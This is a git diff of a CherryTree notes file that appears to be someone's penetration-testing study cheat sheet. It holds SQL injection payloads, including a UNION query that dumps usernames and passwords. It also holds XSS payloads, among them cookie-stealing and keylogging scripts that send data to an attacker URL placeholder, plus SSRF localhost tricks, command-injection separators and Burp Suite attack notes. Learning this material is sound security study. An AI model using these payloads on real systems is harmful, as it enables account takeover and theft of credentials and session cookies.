@@ -1,27 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="General" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1695157186" ts_lastsave="1698759322">
+  <node name="General" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1695157186" ts_lastsave="1702907635">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 
 
 
 </rich_text>
-    <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1699450210">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Execute bash commands:
-</rich_text>
-      <rich_text indent="1">import os; print(os.popen("</rich_text>
-      <rich_text indent="1" weight="heavy">COMMAND</rich_text>
-      <rich_text indent="1">").read())</rich_text>
-      <rich_text>
-
-Webserver:
-</rich_text>
-      <rich_text indent="1">python3 -m http.server </rich_text>
-      <rich_text weight="heavy">PORT</rich_text>
-    </node>
     <node name="Passive Recon" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695238541" ts_lastsave="1697102226">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 whois </rich_text>
@@ -161,6 +147,39 @@ intitle:</rich_text>
 
 </rich_text>
       <rich_text link="webs https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</rich_text>
+    </node>
+  </node>
+  <node name="Scripting" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1702907635" ts_lastsave="1702911773">
+    <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1702907639">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Execute bash commands:
+</rich_text>
+      <rich_text indent="1">import os; print(os.popen("</rich_text>
+      <rich_text indent="1" weight="heavy">COMMAND</rich_text>
+      <rich_text indent="1">").read())</rich_text>
+      <rich_text>
+
+Webserver:
+</rich_text>
+      <rich_text indent="1">python3 -m http.server </rich_text>
+      <rich_text weight="heavy">PORT</rich_text>
+    </node>
+    <node name="Bash" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702907342" ts_lastsave="1702907641">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#!/bin/bash
+
+for i in {</rich_text>
+      <rich_text weight="heavy">START</rich_text>
+      <rich_text>..</rich_text>
+      <rich_text weight="heavy">END</rich_text>
+      <rich_text>..</rich_text>
+      <rich_text weight="heavy">INCREMENT</rich_text>
+      <rich_text>}
+do 
+  </rich_text>
+      <rich_text weight="heavy">SCRIPT</rich_text>
+      <rich_text>
+done</rich_text>
     </node>
   </node>
   <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699882207">
@@ -3050,58 +3069,6 @@ Encrypted shells:
       <rich_text>EXEC:"bash -li"
 </rich_text>
     </node>
-    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1700054696">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Auth bypass:
-</rich_text>
-      <rich_text weight="heavy">USERNAME</rich_text>
-      <rich_text>'; -- -
-
-skip any sql statements:
-  ' AND '1'='1 --</rich_text>
-      <rich_text indent="1">
-</rich_text>
-      <rich_text>   ' AND '1'='2 --
-   ' or 1=1--
- 
- partially skip sql statements:
-</rich_text>
-      <rich_text indent="1"> </rich_text>
-      <rich_text weight="heavy">INPUT</rich_text>
-      <rich_text>'--
-
-(SQLite):
-get all tables in the DB:
-</rich_text>
-      <rich_text indent="1">UNION ALL SELECT group_concat(table_name),null,null,null,null FROM information_schema.tables</rich_text>
-      <rich_text>
-
-get all columns in the DB:
-</rich_text>
-      <rich_text indent="1">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns</rich_text>
-      <rich_text>
-
-get all colums of a specific table:
-</rich_text>
-      <rich_text indent="1">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="</rich_text>
-      <rich_text indent="1" weight="heavy">TABLENAME</rich_text>
-      <rich_text indent="1">"</rich_text>
-      <rich_text>
-
-Base select statement:
-UNION ALL SELECT </rich_text>
-      <rich_text weight="heavy">XXXX</rich_text>
-      <rich_text>,null,null,null,null FROM </rich_text>
-      <rich_text weight="heavy">XXXX</rich_text>
-      <rich_text> WHERE </rich_text>
-      <rich_text weight="heavy">XXXX</rich_text>
-      <rich_text>=</rich_text>
-      <rich_text weight="heavy">XXXX</rich_text>
-      <rich_text>
-
-
-</rich_text>
-    </node>
     <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1700228450">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Useful online tools:
@@ -3306,46 +3273,6 @@ Python
         <rich_text indent="2"> LPORT=</rich_text>
         <rich_text indent="2" weight="heavy">PORT</rich_text>
         <rich_text indent="2"> -f raw -o rev_shell.py</rich_text>
-      </node>
-    </node>
-    <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1699449866">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Types:
-DOM (Special)
-</rich_text>
-      <rich_text indent="1">DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the &lt;script&gt;&lt;/script&gt; HTML tag.</rich_text>
-      <rich_text>
-Persistent (Server-side)
-</rich_text>
-      <rich_text indent="1">Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. </rich_text>
-      <rich_text>
-Reflected (Client-side)
-</rich_text>
-      <rich_text indent="1">Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.</rich_text>
-      <rich_text>
-
-
-
-
-</rich_text>
-      <node name="Commands" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1698765112" ts_lastsave="1698765348">
-        <rich_text>test DOM:
-</rich_text>
-        <rich_text indent="1">create alert notification</rich_text>
-        <rich_text>
-</rich_text>
-        <rich_text indent="1">&lt;iframe src="javascript:alert(`xss`)"&gt;</rich_text>
-        <rich_text>
-
-adding header in the HTTP request
-</rich_text>
-        <rich_text indent="1">for example if last login IP is being registered on the website:</rich_text>
-        <rich_text>
-</rich_text>
-        <rich_text indent="2">True-Client-IP: &lt;iframe src="javascript:alert(`xss`)"&gt;</rich_text>
-        <rich_text>
-
-changing query parameter values</rich_text>
       </node>
     </node>
   </node>
@@ -3725,7 +3652,7 @@ Kernel exploits:
 </rich_text>
     <rich_text indent="2">perl linux-exploit-suggester-2.pl</rich_text>
   </node>
-  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1700230376">
+  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1701685992">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 Local File Inclusion:
@@ -3817,7 +3744,48 @@ UPLOAD EXPLOITATION:
     <rich_text>filtering based on MIME types.
 </rich_text>
     <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
-    <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699967980">
+    <rich_text>
+
+SSRF:
+</rich_text>
+    <rich_text indent="1">Modify navigated URL:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">change the ?url parameter in the request</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">Directory traversal:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">in ?url parameter add /../</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">add &amp;x= to stop remaining path from being appended to url</rich_text>
+    <rich_text>
+
+Catch HTTP requests:
+</rich_text>
+    <rich_text indent="1">requestbin.com</rich_text>
+    <rich_text>
+
+alternative localhost references:
+</rich_text>
+    <rich_text indent="1">0
+0.0.0.0
+0000
+127.1
+127.*.*.*
+2130706433
+017700000001</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">127.0.0.1.nip.io</rich_text>
+    <rich_text>
+
+Metadata cloud server:
+</rich_text>
+    <rich_text indent="2">169.254.169.254</rich_text>
+    <node name="Upload Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1702483902">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 basic ways to bypass client-side file upload filter:
 
@@ -3863,6 +3831,295 @@ Basic server-side filter bypass
 
 </rich_text>
     </node>
+    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1702904147">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Auth bypass:
+</rich_text>
+      <rich_text weight="heavy">USERNAME</rich_text>
+      <rich_text>'; -- -
+
+skip any sql statements:
+  ' AND '1'='1 --</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text>   ' AND '1'='2 --
+   ' or 1=1--
+ 
+ partially skip sql statements:
+</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text weight="heavy">INPUT</rich_text>
+      <rich_text>'--
+
+(SQLite):
+</rich_text>
+      <rich_text indent="1">Useful System databases &amp; tables:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">SELECT database()</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = '</rich_text>
+      <rich_text indent="2" weight="heavy">DB_NAME</rich_text>
+      <rich_text indent="2">'</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">SELECT group_concat(table_name) FROM information_schema.columns WHERE table_name = '</rich_text>
+      <rich_text indent="2" weight="heavy">TABLE_NAME</rich_text>
+      <rich_text indent="2">'</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text indent="1">get all tables in the DB:
+</rich_text>
+      <rich_text indent="2">UNION ALL SELECT group_concat(table_name),null,null,null,null FROM information_schema.tables</rich_text>
+      <rich_text indent="1">
+
+get all columns in the DB:
+</rich_text>
+      <rich_text indent="2">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns</rich_text>
+      <rich_text indent="1">
+
+get all colums of a specific table:
+</rich_text>
+      <rich_text indent="2">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="</rich_text>
+      <rich_text indent="2" weight="heavy">TABLENAME</rich_text>
+      <rich_text indent="2">"</rich_text>
+      <rich_text indent="1">
+
+get username and password combo:
+</rich_text>
+      <rich_text indent="2">UNION SELECT group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM users</rich_text>
+      <rich_text>
+
+Blind SQL recon:
+</rich_text>
+      <rich_text indent="1">Use resoponse time to identify correct values</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Find #columns:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">‘ UNION SELECT SLEEP(5),2,3,4;--</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Find DB:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">' UNION SELECT SLEEP(5),2 where database() like '%';--</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Find Table:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
+      <rich_text>FROM information_schema.tables WHERE table_schema like '</rich_text>
+      <rich_text weight="heavy">DB_NAME</rich_text>
+      <rich_text>' and table_name like '%';--
+</rich_text>
+      <rich_text indent="1">Find Column</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
+      <rich_text>FROM information_schema.COLUMNS WHERE TABLE_SCHEMA like '</rich_text>
+      <rich_text weight="heavy">DB_NAME</rich_text>
+      <rich_text>' and TABLE_NAME like '</rich_text>
+      <rich_text weight="heavy">TABLE_NAME</rich_text>
+      <rich_text>' and COLUMN_NAME like '%';--
+</rich_text>
+      <rich_text indent="1">Find Values:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
+      <rich_text>FROM </rich_text>
+      <rich_text weight="heavy">TABLE_NAME</rich_text>
+      <rich_text> where </rich_text>
+      <rich_text weight="heavy">COLUMN_NAME</rich_text>
+      <rich_text> like '%' ;--
+
+
+</rich_text>
+      <node name="Info" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702895002" ts_lastsave="1702905742">
+        <rich_text>In-Band SQL Injection:</rich_text>
+        <rich_text indent="1">
+In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
+
+</rich_text>
+        <rich_text>Error-Based SQL Injection:</rich_text>
+        <rich_text indent="1">
+This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 
+
+</rich_text>
+        <rich_text>Union-Based SQL Injection:</rich_text>
+        <rich_text indent="1">
+This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.</rich_text>
+        <rich_text>
+
+Blind SQL Injection:
+</rich_text>
+        <rich_text indent="1">Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.</rich_text>
+        <rich_text>
+
+Out-Of-Band SQL Injection:
+</rich_text>
+        <rich_text indent="1">An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.</rich_text>
+      </node>
+    </node>
+    <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1702483860">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+test XSS:
+</rich_text>
+      <rich_text indent="1">Base:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">&lt;input value="INPUT"&gt;</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2">"&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">&lt;textarea&gt;INPUT&lt;/textarea&gt;</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2">&lt;/textarea&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">inside JS code:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">';alert('XSS');//</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">filter on "script":</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">&lt;sscriptcript&gt;alert('XSS');&lt;/sscriptcript&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">&lt;img src="INPUT"&gt;</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2" weight="heavy">PATH_TO_IMAGE</rich_text>
+      <rich_text indent="2">" onload="alert('THM');</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">General XSS bypass polyglot:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</rich_text>
+      <rich_text>
+
+
+test DOM:
+</rich_text>
+      <rich_text indent="1">create alert notification</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">&lt;iframe src="javascript:alert(`xss`)"&gt;</rich_text>
+      <rich_text>
+
+Session stealing:
+</rich_text>
+      <rich_text indent="1">&lt;script&gt;fetch('https://</rich_text>
+      <rich_text indent="1" weight="heavy">WEBSITE_HACKER_URL</rich_text>
+      <rich_text indent="1">?cookie=' + btoa(document.cookie));&lt;/script&gt;</rich_text>
+      <rich_text>
+
+Key logger:
+</rich_text>
+      <rich_text indent="1">&lt;script&gt;document.onkeypress = function(e) { fetch('https://</rich_text>
+      <rich_text indent="1" weight="heavy">WEBSITE_HACKER_URL</rich_text>
+      <rich_text indent="1">?key=' + btoa(e.key) );}&lt;/script&gt;</rich_text>
+      <rich_text>
+
+Execute functions with specific parameters
+</rich_text>
+      <rich_text indent="1">example: user.changeEmail() = function to change email -&gt; reset account login</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">&lt;script&gt;user.changeEmail('attacker@hotmail.com');&lt;/script&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <node name="Info" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702483796" ts_lastsave="1702895044">
+        <rich_text>DOM (Special):
+</rich_text>
+        <rich_text indent="1">DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the &lt;script&gt;&lt;/script&gt; HTML tag.</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">controllable JS variables/parameters (ex: window.location.x</rich_text>
+        <rich_text>)
+</rich_text>
+        <rich_text indent="2">controllable JS functions (ex: eval())</rich_text>
+        <rich_text>
+
+Stored (Server-side):
+</rich_text>
+        <rich_text indent="1">Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. </rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">Comments on a blog
+User profile information
+Website Listings</rich_text>
+        <rich_text>
+
+Blind XSS (Server-side):
+</rich_text>
+        <rich_text indent="1">Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">use the XSS Hunter Express tool </rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">https://github.com/mandatoryprogrammer/xsshunter-express</rich_text>
+        <rich_text>
+
+Reflected (Client-side):
+</rich_text>
+        <rich_text indent="1">Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">query parameters
+URL file path
+HTTP headers</rich_text>
+        <rich_text>
+</rich_text>
+      </node>
+    </node>
+    <node name="Command Injection" unique_id="102" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702483860" ts_lastsave="1702484549">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PHP vulnerable functions:
+</rich_text>
+      <rich_text indent="1">Exec
+Passthru
+System</rich_text>
+      <rich_text>
+
+Input Filtering: use hex
+
+use ; &amp; &amp;&amp;</rich_text>
+      <node name="Info" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702483860" ts_lastsave="1702895052">
+        <rich_text>Types:
+</rich_text>
+        <rich_text indent="1">Blind
+</rich_text>
+        <rich_text indent="2">This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="1">Verbose</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the whoami command to see what user the application is running under. The web application will output the username on the page directly.</rich_text>
+        <rich_text>
+
+useful commands:
+</rich_text>
+        <rich_text indent="1" link="webs https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</rich_text>
+      </node>
+    </node>
   </node>
   <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699550842">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -3871,14 +4128,64 @@ Check available sudo commands:
 </rich_text>
     <rich_text indent="1">sudo -l</rich_text>
   </node>
-  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1699869568">
+  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1702910117">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
-
+Updating cookie &amp; token with Macro:
 </rich_text>
-    <node name="Basic info" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697139099" ts_lastsave="1699449925">
+    <rich_text indent="1">Capture the request to the general page
+</rich_text>
+    <rich_text indent="2">Identify the cookie-name and CSRF-token-parameter name</rich_text>
+    <rich_text indent="1">
+Go to main settings -&gt; sessions
+</rich_text>
+    <rich_text indent="2">Go to Macro's and click Add</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="3">Select the correct GET request</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="2">Go to Session Handling Rules and click Add</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">Open the Scope tab and select the tool and only ise suite scope</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">In the Details tab Add a Rule Action</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">Select Run a Macro</rich_text>
+    <rich_text> and select the created Macro
+</rich_text>
+    <rich_text indent="4">Select "Update only the following parameters and headers", then click the Edit.
+</rich_text>
+    <rich_text indent="5">In the "Enter a new item" text field, type "</rich_text>
+    <rich_text indent="5" weight="heavy">CSRF-token-parameter-name</rich_text>
+    <rich_text indent="5">". Press Add, then Close.</rich_text>
+    <rich_text indent="4">
+Select "Update only the following cookies", then click the relevant Edit button.
+</rich_text>
+    <rich_text indent="5">Enter "</rich_text>
+    <rich_text indent="5" weight="heavy">cookie-name</rich_text>
+    <rich_text indent="5">" in the "Enter a new item" text field. Press Add, then Close.</rich_text>
+    <rich_text>
+
+
+Shortcuts:
+</rich_text>
+    <rich_text indent="1">Ctrl + Shift + D -&gt; Switch to the Dashboard
+Ctrl + Shift + T -&gt; Switch to the Target tab
+Ctrl + Shift + P -&gt; Switch to the Proxy tab
+Ctrl + Shift + I -&gt; Switch to the Intruder tab
+Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">Ctrl + U -&gt;</rich_text>
+    <rich_text>URL encode selected text
+</rich_text>
+    <node name="Modules" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1702910338">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Tools:
+Modules:
 </rich_text>
       <rich_text indent="1" weight="heavy">Proxy</rich_text>
       <rich_text indent="1">: Intercept and modify requests/responses when interacting with web applications.
@@ -3899,30 +4206,55 @@ Tools:
       <rich_text indent="1">: Assess the randomness of tokens such as session cookie values or other supposedly random generated data. </rich_text>
       <rich_text>
 
-Shortcuts:
+INTRUDER:
 </rich_text>
-      <rich_text indent="1">Ctrl + Shift + D -&gt; Switch to the Dashboard
-Ctrl + Shift + T -&gt; Switch to the Target tab
-Ctrl + Shift + P -&gt; Switch to the Proxy tab
-Ctrl + Shift + I -&gt; Switch to the Intruder tab
-Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
+      <rich_text indent="1">Sniper Attack:</rich_text>
       <rich_text>
 </rich_text>
-      <rich_text indent="1">Ctrl + U -&gt;</rich_text>
-      <rich_text>URL encode selected text
-
-
+      <rich_text indent="2">The Sniper attack type is the default and most commonly used attack type in Burp Suite Intruder. It is particularly effective for single-position attacks, such as password brute-force or fuzzing for API endpoints. In a Sniper attack, we provide a set of payloads, which can be a wordlist or a range of numbers, and Intruder inserts each payload into each defined position in the request.</rich_text>
+      <rich_text>
 
 </rich_text>
-    </node>
-    <node name="Finetune" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1699449922">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-intercepting only relevant data:
+      <rich_text indent="1">Battering Ram Attack:</rich_text>
+      <rich_text>
 </rich_text>
-      <rich_text indent="1">go to target
-add to scope
-go to proxy setting
-adjust interception rule to include scope only</rich_text>
+      <rich_text indent="2">The Battering ram attack type in Burp Suite Intruder differs from Sniper in that it places the same payload in every position simultaneously, rather than substituting each payload into each position in turn.</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text indent="1">Pitchfork Attack:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">The Pitchfork attack type in Burp Suite Intruder is similar to having multiple Sniper attacks running simultaneously. While Sniper uses one payload set to test all positions simultaneously, Pitchfork utilises one payload set per position (up to a maximum of 20) and iterates through them all simultaneously.</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text indent="1">Cluster Bomb Attack:</rich_text>
+      <rich_text>
+</rich_text>
